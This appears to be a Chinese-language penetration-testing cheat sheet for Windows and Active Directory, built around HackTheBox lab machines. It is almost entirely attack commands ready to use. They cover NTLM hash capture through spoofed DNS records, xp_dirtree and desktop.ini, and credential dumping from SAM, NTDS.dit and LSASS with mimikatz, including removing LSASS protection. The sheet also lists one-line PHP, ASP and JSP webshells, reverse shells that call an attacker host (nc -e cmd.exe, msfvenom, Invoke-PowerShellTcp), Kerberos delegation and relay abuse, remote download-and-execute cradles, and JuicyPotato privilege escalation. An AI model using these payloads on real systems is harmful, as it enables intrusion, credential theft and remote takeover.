<figure class="highlight ps"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Check web server status. Scheduled to run every 5min</span></span><br><span class="line"><span class="built_in">Import-Module</span> ActiveDirectory </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$record</span> <span class="keyword">in</span> <span class="built_in">Get-ChildItem</span> <span class="string">&quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot;</span> | <span class="built_in">Where-Object</span> Name <span class="operator">-like</span> <span class="string">&quot;web*&quot;</span>)  &#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="variable">$request</span> = <span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> <span class="string">&quot;http://<span class="variable">$</span>(<span class="variable">$record</span>.Name)&quot;</span> <span class="literal">-UseDefaultCredentials</span></span><br><span class="line">		<span class="keyword">if</span>(.StatusCode <span class="operator">-ne</span> <span class="number">200</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">Send-MailMessage</span> <span class="literal">-From</span> <span class="string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> <span class="literal">-To</span> <span class="string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> <span class="literal">-Subject</span> <span class="string">&quot;Host: <span class="variable">$</span>(<span class="variable">$record</span>.Name) is down&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line">		<span class="keyword">catch</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>伪造域名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;dirkjanm&#x2F;krbrelayx&#x2F;master&#x2F;dnstool.py</span><br><span class="line">python3 dnstool.py -u &quot;intelligence.htb\Tiffany.Molina&quot; -p NewIntelligenceCorpUser9876 --action add -r webbufferfly.intelligence.htb -d 10.10.*.* 10.10.10.248</span><br></pre></td></tr></table></figure>
<ul>
<li>MSSQL</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python mssqlclient.py PublicUser:GuestUserCantWrite1@10.10.11.202</span><br><span class="line"><span class="built_in">exec</span> master.dbo.xp_dirtree <span class="string">&#x27;\\10.10.*.*\BFL&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>RFI</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">// [2] include(/header.inc): failed to open stream: No such file or directory On line 36 in file C:\inetpub\wwwroot\functions.php</span></span><br><span class="line">	<span class="comment">// Following function securely includes a file. Whenever we </span></span><br><span class="line">	<span class="comment">// will encounter a PHP tag we will just bail out here. </span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">secure_include</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">		<span class="keyword">if</span> (strpos(file_get_contents(<span class="variable">$file</span>),<span class="string">&#x27;&lt;?&#x27;</span>) === <span class="literal">false</span>) &#123; </span><br><span class="line">			<span class="keyword">include</span>(<span class="variable">$file</span>);		  <span class="comment">//&lt;&lt;&lt;&lt;&lt; Error encountered in this line.</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">			http_response_code(<span class="number">403</span>); </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Forbidden - Tampering attempt detected.&#x27;</span>); </span><br><span class="line">		&#125; </span><br><span class="line">	&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.231/licenses/licenses.php?theme=//10.10.*.*&amp;h=b1a3d9ecf02d4854f3a730f8b2a9af5d</span><br></pre></td></tr></table></figure>
<ul>
<li>desktop.ini</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini">https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[.ShellClassInfo]</span><br><span class="line">IconResource&#x3D;\\10.10.*.*\BFL</span><br></pre></td></tr></table></figure>
<p>爆破NTLMv2</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<h3 id="windows-credential-manager"><a class="markdownIt-Anchor" href="#windows-credential-manager"></a> Windows Credential Manager</h3>
<ul>
<li>Web Credential</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-WebCredentials.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-WebCredentials.ps1</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vaultcmd &#x2F;list</span><br><span class="line">vaultcmd &#x2F;listproperties:&quot;Web Credentials&quot;</span><br><span class="line">vaultcmd &#x2F;listcreds:&quot;Web Credemtials&quot;</span><br><span class="line">. .\Get-WebCredentials.ps1</span><br><span class="line">Get-WebCredentials</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows Credential</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmdkey &#x2F;list</span><br><span class="line">runas &#x2F;savecred &#x2F;user:$user cmd.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>&quot;</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::credman</span><br></pre></td></tr></table></figure>
<h3 id="laps"><a class="markdownIt-Anchor" href="#laps"></a> LAPS</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir &quot;c:\program files\laps\admpwd.dll&quot;</span><br><span class="line">find-admpwdextendedrights -identity *</span><br><span class="line">get-admpwdpassword -computername *</span><br></pre></td></tr></table></figure>
<h3 id="sam"><a class="markdownIt-Anchor" href="#sam"></a> SAM</h3>
<ul>
<li>SAM <code>c:\windows\system32\config\system</code></li>
<li>SYSTEM <code>c:\windows\system32\config\sam</code></li>
<li>Meterpreter
<ul>
<li>hashdump</li>
</ul>
</li>
<li>Volume Shadow Copy</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmic shadowcopy call create volume&#x3D;&quot;c:\&quot;</span><br><span class="line">vssadmin list shadows</span><br><span class="line">copy \\?\globalroot\device\harddiskvolumeshadowcopy1\windows\system32\config\sam .\sam</span><br><span class="line">copy \\?\globalroot\device\harddiskvolumeshadowcopy1\windows\system32\config\system .\system</span><br></pre></td></tr></table></figure>
<ul>
<li>Registry</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam .\sam</span><br><span class="line">reg save hklm\system .\system</span><br></pre></td></tr></table></figure>
<ul>
<li><code>python secretsdump.py local -system /tmp/SYSTEM -sam /tmp/SAM</code></li>
</ul>
<h3 id="ntdsdit"><a class="markdownIt-Anchor" href="#ntdsdit"></a> NTDS.DIT</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ntds</span><br><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full .\ntds&quot; q q</span><br></pre></td></tr></table></figure>
<h3 id="lsass"><a class="markdownIt-Anchor" href="#lsass"></a> LSASS</h3>
<ul>
<li>Memory Dump
<ul>
<li>taskmgr</li>
<li>&quot;</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpaswords</span><br></pre></td></tr></table></figure>
<ul>
<li>Protected LSASS
<ul>
<li>reg</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa &#x2F;f RunAsPPL</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa &#x2F;v RunAsPPL &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure>
<ul>
<li>&quot;<br />
(mimidrv.sys)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!+</span><br><span class="line">!processprotect &#x2F;process:lsass.exe &#x2F;remove</span><br><span class="line">sekurlsa::logonpaswords</span><br></pre></td></tr></table></figure>
<h2 id="getshell"><a class="markdownIt-Anchor" href="#getshell"></a> GetShell</h2>
<ul>
<li>psexec
<ul>
<li>路径写权限</li>
</ul>
</li>
<li>evil-winrm</li>
<li>ssh</li>
<li>mssql</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python mssqlclient.py ARCHETYPE&#x2F;sql_svc@10.10.10.27  -windows-auth</span><br><span class="line">enable_xp_cmdshell</span><br><span class="line">xp_cmdshell whoami</span><br></pre></td></tr></table></figure>
<ul>
<li>wmiexec</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb</span><br></pre></td></tr></table></figure>
<ul>
<li>WebShell
<ul>
<li>PHP: <code>&lt;?php @eval($_POST[&quot;BFL&quot;]);?&gt;</code></li>
<li>PHP_Reverse_Shell: <a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></li>
<li>ASP: <code>&lt;%eval request(&quot;BFL&quot;)%&gt;</code></li>
<li>ASPX: <code>&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[&quot;BFL&quot;],”unsafe”);%&gt;</code></li>
<li>JSP: <code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;BFL&quot;));%&gt;</code></li>
</ul>
</li>
<li>PowerShellTCP
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a></li>
<li><code>Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.2 -Port 9999</code></li>
</ul>
</li>
<li>service
<ul>
<li>runas用于生成带有目标用户令牌的Shell</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">runas &#x2F;netonly &#x2F;user:$domain\$username &quot;nc64.exe -e cmd.exe $hostname $port&quot;</span><br><span class="line">$password</span><br><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;$ip LPORT&#x3D;$port -f exe-service -o bfl.exe</span><br><span class="line">smbclient -c &quot;put bfl.exe&quot; -U $username -W $domain &quot;&#x2F;&#x2F;$ip&#x2F;admin$&#x2F;&quot; $password</span><br><span class="line">sc \\$ip create bflservice binpath&#x3D;&quot;c:\windows\bfl.exe&quot;</span><br><span class="line">sc \\$ip start bflservice</span><br></pre></td></tr></table></figure>
<ul>
<li>schtasks
<ul>
<li>runas用于生成带有目标用户令牌的Shell</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">runas &#x2F;netonly &#x2F;user:$domain\$username &quot;nc64.exe -e cmd.exe $ip $port&quot;</span><br><span class="line">$password</span><br><span class="line">schtask &#x2F;s $ip &#x2F;ru &quot;system&quot; &#x2F;create &#x2F;tn &quot;bfltask&quot; &#x2F;tr &quot;nc.exe -e cmd.exe $ip $port&quot; &#x2F;sc once &#x2F;sd 01&#x2F;01&#x2F;1970 &#x2F;st 00:00</span><br><span class="line">schtasks &#x2F;s $ip &#x2F;run &#x2F;tn &quot;bfltask&quot;</span><br><span class="line">schtsaks &#x2F;s $ip &#x2F;run &#x2F;tn &quot;bfltask&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>VBS</li>
</ul>
<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateObject(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;nc64.exe -e cmd.exe $ip $port&quot;</span>, <span class="number">0</span>, <span class="literal">True</span></span><br></pre></td></tr></table></figure>
<ul>
<li>RDP Hijacking</li>
</ul>
<blockquote>
<p>When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.<br />
Windows Server 2019 won’t allow you to connect to another user’s session without knowing its password.</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psexec64.exe -s cmd.exe</span><br><span class="line">query user</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> USERNAME			SESSIONNAME	   ID  STATE   IDLE TIME  LOGON TIME</span><br><span class="line">&gt;administrator	 rdp-tcp#6		 2  Active		.  4&#x2F;1&#x2F;2022 4:09 AM</span><br><span class="line"> luke									3  Disc		   .  4&#x2F;6&#x2F;2022 6:51 AM</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tscon 3 &#x2F;dest:rdp-tcp#6</span><br></pre></td></tr></table></figure>
<h2 id="unconstrained-delegation"><a class="markdownIt-Anchor" href="#unconstrained-delegation"></a> Unconstrained Delegation</h2>
<p><strong>TRUSTED_FOR_DELEGATION</strong></p>
<blockquote>
<p>In the background, if a user with the “TRUSTED_FOR_DELEGATION” flag set authenticates to a host with Unconstrained Delegation configured, a ticket-granting ticket (TGT) for that user account is generated and stored in memory so it can be used later if needed.</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get-netcomputer -unconstrained</span><br><span class="line">rubeus klist</span><br><span class="line">rubeus dump</span><br><span class="line">rubeus ptt &#x2F;ticket:$ticket</span><br></pre></td></tr></table></figure>
<h2 id="constrained-delegation"><a class="markdownIt-Anchor" href="#constrained-delegation"></a> Constrained Delegation</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Recon&#x2F;PowerView.ps1 -O</span><br><span class="line">. .\PowerView.ps1</span><br><span class="line">get-netuser -trustedtoauth</span><br></pre></td></tr></table></figure>
<p><strong>msds-allowedtodelegateto</strong></p>
<p>&quot;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::secrets</span><br></pre></td></tr></table></figure>
<p>kekeo</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask &#x2F;user:$user &#x2F;domain:$domain &#x2F;password:$password</span><br><span class="line">tgs::s4u &#x2F;tgt:$tgt_file &#x2F;user:$user &#x2F;service:$service&#x2F;$hostname</span><br></pre></td></tr></table></figure>
<p>&quot;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::ptt $tgs_file</span><br></pre></td></tr></table></figure>
<p>http + wsman -&gt; powershell remoting</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New-PSSession -ComputerName $hostname</span><br><span class="line">Enter-PSSession -ComputerName $hostname</span><br></pre></td></tr></table></figure>
<h2 id="print-spooler-service-mitm"><a class="markdownIt-Anchor" href="#print-spooler-service-mitm"></a> Print Spooler Service MITM</h2>
<ul>
<li>一台机器对另一台机器有管理员权限</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gwmi win32_printer -computer $admin_ip</span><br><span class="line">get-printerport -computername $admin_ip</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script&#x3D;smb2-security-mode $admin_ip $target_ip</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python ntlmrelayx.py -smb2support -t smb:&#x2F;&#x2F;$target_ip -debug</span><br><span class="line">python ntlmrelayx.py -smb2support -t smb:&#x2F;&#x2F;$target_ip -debug -c &quot;whoami &#x2F;all&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spoolsample.exe $admin_ip $mitm_ip</span><br></pre></td></tr></table></figure>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></p>
</blockquote>
<h2 id="注册表"><a class="markdownIt-Anchor" href="#注册表"></a> 注册表</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query hklm &#x2F;f password &#x2F;t reg_sz &#x2F;s</span><br><span class="line">reg query hkcu &#x2F;f password &#x2F;t reg_sz &#x2F;s</span><br></pre></td></tr></table></figure>
<h2 id="路径"><a class="markdownIt-Anchor" href="#路径"></a> 路径</h2>
<ul>
<li>powershell history: <code>&quot;c:\users\$user\appdata\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt&quot;</code></li>
<li>redif conf: <code>&quot;c:\program files\redis\redis.windows.conf&quot;</code></li>
<li>mssql conf: <code>&quot;c:\program files\microsoft sql server\&quot;</code></li>
<li>mRemoteNG: <code>c:\users\$user\appdata\roaming\mremoteng\confcons.xml</code></li>
<li>WEB &amp; SMB &amp; FTP</li>
<li>firefox: <code>c:\users\$user\appdata\roaming\mozilla</code>
<ul>
<li><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py">https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py</a></li>
</ul>
</li>
<li>MCAFEE: <code>c:\programdata\mcafee\agent\db\ma.db</code></li>
<li>APPLocker: <code>c:\windows\system32\spool\drivers\color\</code></li>
</ul>
<h2 id="文件传输-2"><a class="markdownIt-Anchor" href="#文件传输-2"></a> 文件传输</h2>
<ul>
<li>Server
<ul>
<li>smb</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbserver.py Bufferfly . -smb2support -username Buffer -password fly &amp;</span><br></pre></td></tr></table></figure>
<ul>
<li>http</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80 &amp;</span><br></pre></td></tr></table></figure>
</li>
<li>client
<ul>
<li>curl</li>
<li>wget</li>
<li><code>iex(new-object net.webclient).downloadstring(&quot;http://10.10.*.*/PowerView.ps1&quot;)</code></li>
<li><code>$WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile(&quot;http://10.4.23.166/JuicyPotato.exe&quot;, &quot;C:\users\bruce\desktop\juicy.exe&quot;)</code></li>
<li><code>iwr -uri http://192.168.45.187/winPEASany.exe -outfile winPEASany.exe</code></li>
<li><code>certutil -urlcache -split -f http://10.50.98.5:8888/bfl.exe</code></li>
<li>smb<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.10.*.*\Bufferfly &#x2F;u:Buffer fly</span><br><span class="line">copy test \\10.10.*.*</span><br><span class="line">net use &#x2F;d \\10.10.*.*\Bufferfly</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h2 id="端口转发"><a class="markdownIt-Anchor" href="#端口转发"></a> 端口转发</h2>
<ul>
<li>lcx
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/windworst/LCX">https://github.com/windworst/LCX</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/AA8j/SecTools/raw/main/lcx/lcx.exe">https://github.com/AA8j/SecTools/raw/main/lcx/lcx.exe</a></li>
</ul>
</li>
<li>chisel
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></li>
</ul>
</li>
<li>earthworm
<ul>
<li><a target="_blank" rel="noopener" href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></li>
</ul>
</li>
<li>sshuttle
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/sshuttle/sshuttle">https://github.com/sshuttle/sshuttle</a></li>
</ul>
</li>
</ul>
<h2 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h2>
<h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> EXP</h3>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213">https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2019-1388">https://github.com/jas502n/CVE-2019-1388</a></li>
</ul>
<h3 id="runascs"><a class="markdownIt-Anchor" href="#runascs"></a> runascs</h3>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RunasCs/">https://github.com/antonioCoco/RunasCs/</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runascs c.bum Tikkycoll_431012284 powershell -r 10.10.*.*:9998</span><br></pre></td></tr></table></figure>
<h3 id="printnightmare"><a class="markdownIt-Anchor" href="#printnightmare"></a> PrintNightmare</h3>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a><br />
<a target="_blank" rel="noopener" href="https://github.com/m8sec/CVE-2021-34527">https://github.com/m8sec/CVE-2021-34527</a></p>
</blockquote>
<h3 id="alwaysinstallelevated"><a class="markdownIt-Anchor" href="#alwaysinstallelevated"></a> alwaysinstallelevated</h3>
<blockquote>
<p>找到alwaysinstallelevated，即当注册表中的alwaysinstallelevated设置为1时，机器上运行任何的msi程序，均会以system权限执行，我们只需生成一个msi的木马程序即可提权。<br />
<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/375373404">https://zhuanlan.zhihu.com/p/375373404</a></p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">	AlwaysInstallElevated   REG_DWORD   <span class="number">0</span>x1</span><br></pre></td></tr></table></figure>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">	AlwaysInstallElevated   REG_DWORD   <span class="number">0</span>x1</span><br></pre></td></tr></table></figure>
<h3 id="seimpersonateprivilegesecreateglobalprivilege"><a class="markdownIt-Anchor" href="#seimpersonateprivilegesecreateglobalprivilege"></a> SeImpersonatePrivilege/SeCreateGlobalPrivilege</h3>
<p><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe">https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe</a></p>
<p>针对新版本Windows系统<br />
<a target="_blank" rel="noopener" href="https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip">https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip</a></p>
<p>仅用于SeImpersonatePrivilege, 不触发Windows Defender<br />
<a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe">https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe</a></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name	  Description						   State  </span><br><span class="line">======================= ========================================= =======</span><br><span class="line">SeChangeNotifyPrivilege Bypass traverse checking				  Enabled</span><br><span class="line">SeImpersonatePrivilege  Impersonate a client after authentication Enabled</span><br><span class="line">SeCreateGlobalPrivilege Create global objects				   Enabled</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</li>
<li>如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</li>
<li>-t * 为两个均尝试</li>
<li>如果均未开启，那么无法提权</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/god_zzZ/article/details/106334702">https://blog.csdn.net/god_zzZ/article/details/106334702</a></p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p &quot;./nc.exe&quot; -a &quot;-e c:\windows\system32\<span class="built_in">cmd</span>.exe <span class="number">10</span>.<span class="number">10</span>.*.* <span class="number">9995</span>&quot; -l <span class="number">6666</span> -c &#123;F7FD3FD6-<span class="number">9994</span>-<span class="number">452</span>D-<span class="number">8</span>DA7-<span class="number">9</span>A8FD87AEEF4&#125;</span><br></pre></td></tr></table></figure>
